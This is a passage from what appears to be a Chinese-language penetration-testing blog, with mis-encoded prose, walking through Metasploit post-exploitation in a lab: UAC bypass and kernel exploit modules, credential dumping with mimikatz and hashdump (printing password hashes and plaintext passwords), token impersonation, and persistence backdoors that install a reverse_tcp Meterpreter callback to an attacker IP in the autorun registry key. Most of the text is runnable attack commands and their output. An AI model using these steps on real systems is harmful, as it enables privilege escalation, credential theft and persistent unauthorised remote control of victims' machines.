Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ</span><br><span class="line"># ç„¶é¹…è¿™é‡Œå¤±è´¥äº†</span><br></pre></td></tr></table></figure>3.å†…æ ¸æ¼æ´ææƒæ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´</span><br></pre></td></tr></table></figure><h3 id="4-6-è·å–å‡­è¯-1"><a href="#4-6-è·å–å‡­è¯-1" class="headerlink" title="4.6 è·å–å‡­è¯"></a>4.6 è·å–å‡­è¯</h3>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚1.ä½¿ç”¨mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">wdigest  #è·å–Wdigestå¯†ç </span><br><span class="line">mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdumpä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-å‡å†’ä»¤ç‰Œ-1"><a href="#4-7-å‡å†’ä»¤ç‰Œ-1" class="headerlink" title="4.7 å‡å†’ä»¤ç‰Œ"></a>4.7 å‡å†’ä»¤ç‰Œ</h3>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognitoå‡å†’ä»¤ç‰Œ</span><br><span class="line">use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #å‡å†’SYSTEM token</span><br><span class="line">æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\</span><br><span class="line">execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ</span><br><span class="line">æˆ–è€…ç›´æ¥shell</span><br><span class="line">rev2self   #è¿”å›åŸå§‹token</span><br><span class="line"></span><br><span class="line"># 2.steal_tokençªƒå–ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps</span><br><span class="line">drop_token  #åˆ é™¤çªƒå–çš„token</span><br></pre></td></tr></table></figure><h3 id="4-8-æ¤å…¥åé—¨-1"><a href="#4-8-æ¤å…¥åé—¨-1" class="headerlink" title="4.8 æ¤å…¥åé—¨"></a>4.8 æ¤å…¥åé—¨</h3>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚1.persistenceå¯åŠ¨é¡¹åé—¨è·¯å¾„ï¼šmetasploit/scripts/meterpreter/persistenceåŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip</span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit/windows/local/persistence2.metsvcæœåŠ¡åé—¨åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run metsvc â€“A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚3.persistence_exeå†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°<ul><li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li><li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ 